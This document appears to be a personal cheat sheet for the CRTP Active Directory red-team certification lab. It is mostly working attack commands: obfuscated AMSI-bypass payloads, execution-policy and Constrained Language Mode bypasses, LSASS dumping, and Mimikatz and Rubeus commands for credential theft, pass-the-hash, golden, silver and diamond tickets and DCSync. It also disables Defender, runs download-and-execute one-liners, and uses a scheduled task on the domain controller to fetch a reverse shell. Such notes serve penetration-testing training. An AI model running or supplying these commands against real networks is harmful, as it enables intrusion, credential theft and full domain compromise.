# CRTP

- List all the command in a module
    
    ```powershell
    Get-Command -Module <modulename>
    ```
    
- Execution Policy bypass
    
    ```powershell
    powershell -ExeutionPolicy bypass
    powershell -ep bypass
    powershell -c <cmd>
    powershell -encodedcommand
    powershell -enc
    powershell -e
    $env:PSExecutionPolicyPreference="bypass"
    
    # https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/
    ```
    
     
    
- Port Scanner PowerShell script
    
    ```powershell
    80,443,8080 | % {echo ((new-object Net.Sockets.TcpClient).Connect(“172.16.3.11”,$_)) “Port $_ is open!”} 2>$null
    ```
    
- PowerShell command to create shared folder via SMB
    
    ```powershell
    New-SmbShare -Name "Shared Folder" -Path "E:\DSC\" -FullAccess "automationlab\delta","Automationlab\Beta"
    ```
    
- Evasion
    - Obfuscate
        
        ![Untitled](CRTP%206756888251ee43148a0a99964ffc3748/Untitled.png)
        
        ![Untitled](CRTP%206756888251ee43148a0a99964ffc3748/Untitled%201.png)
        
        ![Untitled](CRTP%206756888251ee43148a0a99964ffc3748/Untitled%202.png)
        
    - AMSI Bypass Payloads
        
        [https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
        
        ```powershell
        S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
        ```
        
        ```jsx
        $ZQCUW = @"
        using System;
        using System.Runtime.InteropServices;
        public class ZQCUW {
            [DllImport("kernel32")]
            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
            [DllImport("kernel32")]
            public static extern IntPtr LoadLibrary(string name);
            [DllImport("kernel32")]
            public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        }
        "@
        
        Add-Type $ZQCUW
        
        $BBWHVWQ = [ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115;&#105;&#46;&#100;&#108;&#108;'))")
        $XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, "$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
        $p = 0
        [ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
        $TLML = "0xB8"
        $PURX = "0x57"
        $YNWL = "0x00"
        $RTGX = "0x07"
        $XVON = "0x80"
        $WRUD = "0xC3"
        $KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
        [System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
        
        Message #general
        ```
        
    - Bypassing the security controls in PowerShell
        
        [https://github.com/OmerYa/Invisi-Shell](https://github.com/OmerYa/Invisi-Shell)
        
        - Info
            
            The tool hooks the .NET assemblies
            (System.Management.Automation.dll and System.Core.dll) to bypass
            logging It uses a CLR Profiler API to perform the hook. "A common language runtime (CLR) profiler is a dynamic link library (DLL) that consists of functions that receive messages from, and send messages to, the CLR by using the profiling API. The profiler DLL is loaded by the CLR at run time."
            
        - How to use
            
            ```powershell
            # Using Invisi-Shell With admin privileges:
            RunWithPathAsAdmin.bat  
            # With non-admin privileges:
            RunWithRegistryNonAdmin.bat
            # Type exit from the new PowerShell session to complete the clean-up.
            ```
            
    - CLM Bypass (ConstrainedLanguageMode)
        
        because the madafaker AppLocker 
        
        ```powershell
        # check the rules of App Locker
        reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
        Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
        ```
        
        A way to bypass:
        
        ```powershell
        # from the attacker machine:
        # Load the script
        # and after that run the command :
        Invoke-Command -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local -ScriptBlock ${function:<'function name from the loaded script'>} -Arguments <some arguments>
        ```
        
        ```powershell
        
        $CurrTemp = $env:temp
        $CurrTmp = $env:tmp
        $TEMPBypassPath = "C:\windows\temp"
        $TMPBypassPath = "C:\windows\temp"
        
        Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value "$TEMPBypassPath"
        Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value "$TMPBypassPath"
        
        Invoke-WmiMethod -Class win32_process -Name create -ArgumentList "Powershell.exe"
        sleep 5
        
        #Set it back
        Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value $CurrTmp
        Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value $CurrTemp
        ```
        
    - AMSITrigger
        
        [https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)
        
        ```powershell
        # tool to identify the exact part of a script that is detected
        # Simply provide path to the script file to scan it:
        AmsiTrigger_x64.exe -i C:\AD\Tools\Invoke-PowerShellTcp_Detected.ps1
        ```
        
    - App Locker
        
        ```powershell
        # check if Applocker is configured on
        reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
        ```
        
- LSASS DUMP
    
    ```powershell
    .\rdrleakdiag.exe /p 684 /o \\mcorp-dc\C$\ /fullmemdmp /wait 1
    
    rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 684 \\dcorp-std111\Users\Public\lsass.dmp full
    ```
    
    ![Untitled](CRTP%206756888251ee43148a0a99964ffc3748/Untitled%203.png)
    
- Rubeus
    - PassTheHash
        
        ```powershell
        # Run the compiled application with the asktgt flag to ask the KDC to generate a TGT ticket for us
        .\Rubeus.exe asktgt /domain:dollarcorp.moneycorp.local /user:svcadmin /rc4:b38ff50264b74508085d82c69794a4d8 /ptt
        
        C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
        ```
        
    - Over Pass the hash
        
        ```powershell
        # Below doesnt need elevation
        .\Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
        
        # Below command needs elevation
        .\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
        ```
        
    - Diamond Ticket attack
        
        ```powershell
        # use the following Rubeus command to execute the attack. Note that the command needs
        # to be run from an elevated shell (Run as administrator):
        C:\AD\Tools\Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
        ```
        
- BetterSafetyKatz
    - Golden Ticket
        
        ```powershell
        # SID = sid of the domain
        # aes256 = the aes256 hash of the krbtgt 
        
        C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
        ```
        
    - Silver Ticket Attack (DC-HOST Machine account Hash)
        - Info
            
            we have the hash for machine account of the domain
            controller (dcorp-dc$). Using the below command, we can create a Silver Ticket that provides us access
            to the HOST service of DC
            
        
        ```powershell
        C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid: S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:98fb9b154f614d933422b877cd3f2e98 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
        ```
        
        Create Invoke-PowerShellTcpEx.ps1:
        
        - What to do
            
            Create a copy of Invoke-PowerShellTcp.ps1 and rename it to Invoke-PowerShellTcpEx.ps1.
            
            - Open Invoke-PowerShellTcpEx.ps1 in PowerShell ISE (Right click on it and click Edit).
            - Add "Power -Reverse -IPAddress 172.16.100.X -Port 443" (without quotes) to the
            end of the file
        
        Run the below command in the process where we injected the ticket for HOST service. Make sure that the listener is already running:
        
        ```powershell
        # nc listiner
        C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
        ```
        
        ```powershell
        schtasks /create /S dcorp-dc /SC Weekly /RU "NT Authority\SYSTEM" /TN "test" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcpEx.ps1''')'"
        
        schtasks /Run /S dcorp-dc /TN "test"
        ```
        
- WinRs
    
    ![Untitled](CRTP%206756888251ee43148a0a99964ffc3748/Untitled%204.png)
    
- Mimikatz
    - Pass The Hash
        
        ```powershell
        # To perform over pass the ticket we are going to use mimikatz  and Install it on the host machine and type the following command:
        privilege::debug
        sekurlsa::ekeys
        # With the help of ekeys you will able to fetch all keys NTLM (RC4), AES128, AES256 key
        # So with the help of sekurlsa::pth command we try to use ase256 key or aes128 for Kerberos ticket, it is difficult to detect because it is the more common and secure key used in encryption.
        sekurlsa::pth /user:Administrator /domain:ignite.local /aes256:9c83452b5dcdca4b0bae7e89407c700bed3153c31dca06a8d7be29d98e13764c
        sekurlsa::pth /user:Administrator /domain:ignite.local /aes128:b5c9a38d8629e87f5da0a0ff2c67f84c
        
        ```
        
        ```jsx
        Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:a98e18228819e8eec3dfa33cb68b0728 /run:powershell.exe"'
        ```
        
        ![Untitled](CRTP%206756888251ee43148a0a99964ffc3748/Untitled%205.png)
        
    - extract the tickets from lsass
        
        ```powershell
        Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
        ```
        
    - Load the ticket
        
        ```powershell
        Invoke-Mimikatz -Command '"kerberos::ptt [0;60d692]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
        ```
        
    - extract the passwords from lsass
        
        ```powershell
        powershell IEX (New-Object System.Net.Webclient).DownloadString('http://172.16.100.111/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds
        Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
        
        # Download invoke-mimi to the memory
        iex (iwr http://172.16.100.X/Invoke-Mimi.ps1 -UseBasicParsing)
        # create session variable of the target machine
        $sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
        # disable the defender on target machine
        Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
        # run the invoke-mimi function on the target machine
        Invoke-command -ScriptBlock ${function:Invoke-Mimi} -Session $sess
        ```
        
    - extract the credentials from the SAM file
        
        ```powershell
        Invoke-Mimi -Command '"token::elevate" "lsadump::sam"'
        ```
        
    - request TGS
        
        ```powershell
        Invoke-Mimikatz -Command '"kerberos::ask /target:MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433"'
        ```
        
    - list of Kerberos tickets
        
        ```powershell
        Invoke-Mimikatz -Command '"kerberos::list"'
        ```
        
    - DCsync Attack
        
        ```jsx
        Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
        ```
        
    - Get passwords of scheduled tasks
        
        ```jsx
        mimikatz.exe "privilege::debug" "token::elevate" "vault::cred /patch" "exit"
        ```
        
    - **Cracking local windows passwords with Mimikatz**
        
        ```powershell
        # Extracting a copy of the SYSTEM and SAM registry hives
        reg save hklm\sam filename1.hiv
        reg save hklm\security filename2.hiv
        # Dumping the hashes with Mimikatz and LSAdump
        .\mimikatz.exe “privilege::debug” “token::elevate” “lsadump::sam filename1.hiv filename2.hiv”
        ```
        
    - Create a Golden ticket
        
        ```powershell
        # sid = sid of the domain
        # aes256 = the aes256 of the krbtgt
        Invoke-Mimi -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid: S-1-5-21-719815819-3726368948-3917688648 /aes256: 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
        ```
        
- Impacket
    - PassTheHash
        - Info
            
            I wish to execute this attack remotely then use impacket python script **[gettgt.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getTGT.py)**
             which will use a password, hash or aesKey, it will request a TGT and save it as ccache.
            
        
        ```powershell
        python getTGT.py -dc-ip 192.168.1.105 -hashes :32196b56ffe6f45e294117b91a83bf38 ignite.local/Administrator
        ```
        
        - Info
            
            with the help of above command, you will be able to request Kerberos authorized ticket in the form of ccache whereas with the help of the following command you will be able to inject the ticket to access the resource.
            
        
        ```powershell
        export KRB5CCNAME=Administrator.ccache; psexec.py -dc-ip 192.168.1.105 -target-ip 192.168.1.105 -no-pass -k ignite.local/Administrator@WIN-S0V7KMTVLD2.ignite.local
        ```
        
        - POC
            
            ![Untitled](CRTP%206756888251ee43148a0a99964ffc3748/Untitled%206.png)
            
- PS exec
    
    ```powershell
    # open cmd on remote server with system privilege
    psexec \\pc1 -u user -p password -s -i cmd
    ```
    
- PowerShell Download and execute in memory
    
    ```powershell
    powershell "IEX(New-Object Net.WebClient).downloadString(''http://172.16.100.111/InvokePowerShellTcpEx.ps1'')"
    echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile - #From cmd download and execute
    powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
    iex (iwr '10.10.14.9:8000/ipw.ps1') #From PSv3
    
    $h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://10.10.14.9:8000/ipw.ps1',$false);$h.send();iex $h.responseText
    $wr = [System.NET.WebRequest]::Create("http://10.10.14.9:8000/ipw.ps1") $r = $wr.GetResponse() IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd(
    
    #https://twitter.com/Alh4zr3d/status/1566489367232651264
    #host a text record with your payload at one of your (unburned) domains and do this: 
    powershell . (nslookup -q=txt http://some.owned.domain.com)[-1]
    ```
    
    ```powershell
    # Download exe file
    iwr http://172.16.100.111/Loader.exe -OutFile C:\Users\Public\Loader.exe
    
    ```
    
- Import Active Directory Module
    
    ```powershell
    To be able to list all the cmdlets in the module, import the module as well. Remember to import the DLL first. 
    
    PS C:\> Import-Module C:\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose
    
    PS C:\> Import-Module C:\AD\Tools\ADModule\ActiveDirectory\ActiveDirectory.psd1
    
    PS C:\> Get-Command -Module ActiveDirectory
    ```
    
- Domain Enumeration
    - Quick enumeration
        
        ```powershell
        Get-NetDomain #Basic domain info
        #User info
        Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount #Basic user enabled info
        Get-NetUser -LDAPFilter '(sidHistory=*)' #Find users with sidHistory set
        Get-NetUser -PreauthNotRequired #ASREPRoastable users
        Get-NetUser -SPN #Kerberoastable users
        #Groups info
        Get-NetGroup | select samaccountname, admincount, description
        Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=EGOTISTICAL-BANK,DC=local' | %{ $_.SecurityIdentifier } | Convert-SidToName #Get AdminSDHolders
        #Computers
        Get-NetComputer | select samaccountname, operatingsystem
        Get-NetComputer -Unconstrainusered | select samaccountname #DCs always appear but aren't useful for privesc
        Get-NetComputer -TrustedToAuth | select samaccountname #Find computers with Constrained Delegation
        Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'} #Find any machine accounts in privileged groups
        #Shares
        Find-DomainShare -CheckShareAccess #Search readable shares
        #Domain trusts
        Get-NetDomainTrust #Get all domain trusts (parent, children and external)
        Get-NetForestDomain | Get-NetDomainTrust #Enumerate all the trusts of all the domains found
        #LHF
        #Check if any user passwords are set
        $FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl
        #Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
        Find-LocalAdminAccess
        #Get members from Domain Admins (default) and a list of computers and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host. If -Checkaccess, then it also check for LocalAdmin access in the hosts.
        Invoke-UserHunter -CheckAccess
        #Find interesting ACLs
        Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ActiveDirectoryRights | fl
        ```
        
    - Import the Active Directory module without admin privileges
        
        ```powershell
        cd C:\Windows\Microsoft.NET\assembly\GAC_64\Microsoft.ActiveDirectory.Management
        
        # if there are no RSAT installed we can grab the DLL from the system with RSAT and drop it on the system we want to enumerate from (that does not have RSAT installed) and simply import that DLL as a module:
        Import-Module .\Microsoft.ActiveDirectory.Management.dll
        
        # https://github.com/samratashok/ADModule 
        ```
        
    - Find local admin access
        
        ```powershell
        Import-Module C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
        Find-PSRemotingLocalAdminAccess
        
        ```
        
    - Check if users are allowed to creating a new computer object on the domain
        
        ```powershell
        Get-DomainObject -Identity "dc=dollarcorp,dc=moneycorp,dc=local" -Domain dollarcorp.moneycorp.local | select -ExpandProperty ms-ds-machineaccountquota
        ```
        
    - Domain Enum
        
        ```powershell
        # powerview 
        Get-NetGPO
        Get-NetGPO -ComputerName <computername> 
        # Get users which are in a local group of a machine using GPO 
        Find-GPOComputerAdmin -ComputerName DC-1 
        # Get machines where the given user is member of a specific group 
        Find-GPOLocation -Identity shabi -Verbose
        # get the OU in a domain 
        Get-NetOU 
        # Domain Enum ACL 
        # get the ACLs associated with the specified object
        Get-ObjectAcl -SamAccountName shabi -ResolveGUIDs
        # get the ACLs associated with the specified prefix to be used for search
        Get-ObjectAcl -ADSprefix 'CN=Administrator,CN=Users' -Verbose
        ```
        
        ### Domain info
        
        ```powershell
        # Domain Info
        Get-Domain #Get info about the current domain
        Get-NetDomain #Get info about the current domain
        Get-NetDomain -Domain mydomain.local
        Get-DomainSID #Get domain SID
        
        # Policy
        Get-DomainPolicy #Get info about the policy
        (Get-DomainPolicy)."KerberosPolicy" #Kerberos tickets info(MaxServiceAge)
        (Get-DomainPolicy)."SystemAccess" #Password policy
        Get-DomainPolicyData | select -ExpandProperty SystemAccess #Same as previous
        (Get-DomainPolicy).PrivilegeRights #Check your privileges
        Get-DomainPolicyData # Same as Get-DomainPolicy
        
        # Domain Controller
        Get-DomainController | select Forest, Domain, IPAddress, Name, OSVersion | fl # Get specific info of current domain controller
        Get-NetDomainController -Domain mydomain.local #Get all ifo of specific domain Domain Controller
        
        # Get Forest info 
        Get-ForestDomain
        ```
        
        ### Users, Groups, Computers & OUs
        
        ```powershell
        # Users
        ## Get usernames and their groups
        Get-DomainUser -Properties name, MemberOf | fl
        ## Get-DomainUser and Get-NetUser are kind of the same
        Get-NetUser #Get users with several (not all) properties
        Get-NetUser | select samaccountname, description, pwdlastset, logoncount, badpwdcount #List all usernames
        Get-NetUser -UserName student107 #Get info about a user
        Get-NetUser -properties name, description #Get all descriptions
        Get-NetUser -properties name, pwdlastset, logoncount, badpwdcount  #Get all pwdlastset, logoncount and badpwdcount
        Find-UserField -SearchField Description -SearchTerm "built" #Search account with "something" in a parameter
        # Get users with reversible encryption (PWD in clear text with dcsync)
        Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
        
        # Users Filters
        Get-NetUser -UACFilter NOT_ACCOUNTDISABLE -properties distinguishedname #All enabled users
        Get-NetUser -UACFilter ACCOUNTDISABLE #All disabled users
        Get-NetUser -UACFilter SMARTCARD_REQUIRED #Users that require a smart card
        Get-NetUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname #Not smart card users
        Get-NetUser -LDAPFilter '(sidHistory=*)' #Find users with sidHistory set
        Get-NetUser -PreauthNotRequired #ASREPRoastable users
        Get-NetUser -SPN | select serviceprincipalname #Kerberoastable users
        Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'} #Domain admins kerberostable
        Get-Netuser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto #Constrained Resource Delegation
        Get-NetUser -AllowDelegation -AdminCount #All privileged users that aren't marked as sensitive/not for delegation
        # retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
        Get-ObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? {
            ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')
        }
        # Users with PASSWD_NOTREQD set in the userAccountControl means that the user is not subject to the current password policy
        ## Users with this flag might have empty passwords (if allowed) or shorter passwords
        Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
        
        #Groups
        Get-DomainGroup | where Name -like "*Admin*" | select SamAccountName
        ## Get-DomainGroup is similar to Get-NetGroup 
        Get-NetGroup #Get groups
        Get-NetGroup -Domain mydomain.local #Get groups of an specific domain
        Get-NetGroup 'Domain Admins' #Get all data of a group
        Get-NetGroup -AdminCount | select name,memberof,admincount,member | fl #Search admin grups
        Get-NetGroup -UserName "myusername" #Get groups of a user
        Get-NetGroupMember -Identity "Administrators" -Recurse #Get users inside "Administrators" group. If there are groups inside of this grup, the -Recurse option will print the users inside the others groups also
        Get-NetGroupMember -Identity "Enterprise Admins" -Domain mydomain.local #Remember that "Enterprise Admins" group only exists in the rootdomain of the forest
        Get-NetLocalGroup -ComputerName dc.mydomain.local -ListGroups #Get Local groups of a machine (you need admin rights in no DC hosts)
        Get-NetLocalGroupMember -computername dcorp-dc.dollarcorp.moneycorp.local #Get users of localgroups in computer
        Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs #Check AdminSDHolder users
        Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} #Get ObjectACLs by sid
        Get-NetGPOGroup #Get restricted groups
        
        # Computers
        Get-DomainComputer -Properties DnsHostName # Get all domain maes of computers
        ## Get-DomainComputer is kind of the same as Get-NetComputer
        Get-NetComputer #Get all computer objects
        Get-NetComputer -Ping #Send a ping to check if the computers are working
        Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
        Get-NetComputer -TrustedToAuth #Find computers with Constrined Delegation
        Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'} #Find any machine accounts in privileged groups
        
        #OU
        Get-DomainOU -Properties Name | sort -Property Name #Get names of OUs
        Get-DomainOU "Servers" | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties Name} #Get all computers inside an OU (Servers in this case)
        ## Get-DomainOU is kind of the same as Get-NetOU
        Get-NetOU #Get Organization Units
        Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_} #Get all computers inside an OU (StudentMachines in this case)
        #to enumerate GPO applied on the OU
        (Get-DomainOU -Identity StudentMachines).gplink
        #Now, copy the highlighted string from above (no square brackets, no semicolon and nothing after 
        #semicolon) and use the it below:
        Get-DomainGPO -Identity '{7478F170-6A0C-490C-B355-
        9E4618BC785D}'
        ```
        
        - **ACL**
            
            ```powershell
            # Get the ACLs associated with the specified object
            Get-DomainObjectAcl -SamAccountName student1 -ResolveGUIDs
            # enumerate ACLs using ActiveDirectory module but without resolving GUIDs
            ```powershell
            # Get the ACLs associated with the specified object
            Get-DomainObjectAcl -SamAccountName student1 -ResolveGUIDs
            # enumerate ACLs using ActiveDirectory module but without resolving GUIDs
            (Get-Acl'AD:\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access
            # Search for interesting ACEs
            Find-InterestingDomainAcl -ResolveGUIDs
            ```
            
        
        ### Logon and Sessions
        
        ```powershell
        Get-NetLoggedon -ComputerName <servername> #Get net logon users at the moment in a computer (need admins rights on target)
        Get-NetSession -ComputerName <servername> #Get active sessions on the host
        Get-LoggedOnLocal -ComputerName <servername> #Get locally logon users at the moment (need remote registry (default in server OS))
        Get-LastLoggedon -ComputerName <servername> #Get last user logged on (needs admin rigths in host)
        Get-NetRDPSession -ComputerName <servername> #List RDP sessions inside a host (needs admin rights in host)
        ```
        
    - Domain Enum Trusts
        
        ```powershell
        # powerview
        Get-NetDomainTrust
        Get-NetDomainTrust -Domain <DomainName>
        # active directory module
        Get-ADTrust 
        Get-ADTrust -Identity <DomainName>
        #To list only the external trusts in moneycorp.local domain:
        (Get-ADForest).Domains | %{Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)' -Server $_}
        ```
        
    - Domain Enum Forest
        
        ```powershell
        # powerview
        Get-NetForest
        Get-NetForest -Forest <forestname>
        # AD Module
        Get-ADForest
        Get-ADForest -Identity <forestname> 
        # Get all domains in the current forest 
        # powerview 
        Get-NetForestDomain -Forest <forestname>
        # AD Module
        (Get-ADForest).Domain
        
        ```
        
    - Domain Enum User Hunting
        
        ```powershell
        # Find all machine on the current domain where the current user has local admin access 
        Find-LocalAdminAccess -Verbose
        # Find computers where a domain admin ( or specified user/group) has session:
        Invoke-UserHunter
        Invoke-UserHunter -GroupNmae "RDPUsers"
        # confirm admin access 
        Invoke-UserHunter -CheckAccess
        ```
        
    - Domain Enumeration - BloodHound
        
        [https://ernw.de/download/ERNW_DogWhisperer3.pdf](https://ernw.de/download/ERNW_DogWhisperer3.pdf)
        
        ****How to install and run Bloodhound:****
        
        ```bash
        # Install Bloodhound from the apt repository with:
        sudo apt update && sudo apt install -y bloodhound
        # After installation completes, start neo4j with the following command:
        sudo neo4j console
        # Now we need to change the default credentials for neo4j. Navigate to localhost:7474 and login with the default credentials
        username: neo4j
        password: neo4j
        # After logging in, you will be asked to change the default password with a new one. You need this password to later login in the Bloodhound interface
        # Now that the password has been successfully modified you can finally launch Bloodhound with the new credentials.
        # Run the SharpHound script in the foothold computer 
        https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1
        # Use the below command:
        Invoke-BloodHound -CollectionMethod All
        ```
        
        ```powershell
        # BloodHound from windows attacker mechine:
        # Load SharpHound.ps1
        . .\SharpHound.ps1
        Invoke-BloodHound -CollectionMethod All -Verbose
        # To avoid detection like ATA 
        Invoke-BloodHound -CollectionMethod All -ExludeDC
        # Now install and start ne04j server
        # from administrative CMD :
        cd C:\neo4j\neo4j-community-3.5\bin
        neo4j.bat install-service
        neo4j.bat start
        # Open BloodHound application and use the creds: username=neo4j password=neo4j
        # Open the browser and navigate to http://localhost:7474 to change the defaults creds
        # Go back to BloodHound application and Login with the new creds
        # Go to upload data , and upload the zip file from the Sharphound results script. 
        # If the sessions are missings return to the powershell window and run the command:
        Invoke-BloodHound -CollectionMethod LoggedOn -Verbose
        # Now upload this one result as well to the bloodhoun application. 
        ```
        
    - Enumerate for DCsync Attack
        
        ```jsx
        # powerview
        Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
        # Exploit Locally
        Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
        ```
        
    - Enumeration of account with kerberos preauth disable
        
        ```powershell
        # Using Powerview(dev):
        Get-DomainUser -PreauthNotRequired -Verbose
        # Using ActiveDirectory module 
        Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
        # Usingthe script to extract user hash 
        https://raw.githubusercontent.com/HarmJ0y/ASREPRoast/master/ASREPRoast.ps1
        Get-ASREPHash -UserName lydia.karylin -Verbose
        # Cracking the AS-REP Hash 
        # We need into insert 23  after $krb5asrep$
        hashcat -m 18200 '$krb5asrep$23$blackwidow@redwolf.local:0AC0F9425FEA56FBDC65EDC84DA88275$1BBC8576E21155EA6DBF234B22860EB2887A283E7F4CCFBDFA09DB48354C7533CF5DCC1E5929A11FAEC8A7BE5178758811606A75964DBD7A348F123ED2E64DC53434A660B5789B533DE90E049CC1F4DDD0E1D72778796EB22F1BB2DA4F7DB1CBC6705D8DC6360396F7C0586C1CC615E1CF8F666D6986D22C35852A981111B195F3248FB4D69B60999E642BE15099DA3FFFC4844A002B5491E15FDF76B3E88355846DAE95E8F5953BEC64AD8C52D5F3C02C07CD6B60B9D653AE9FB6731C73F01AE9AD06127E89CA6ECB6549CCEC10B9001C45267DF7877EBE11D15C92811CC71B103836257447E3579A4820102213' ~/Wordlist/rockyou.txt
        ```
        
        ```powershell
        # 
        Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
        ```
        
    
    ```powershell
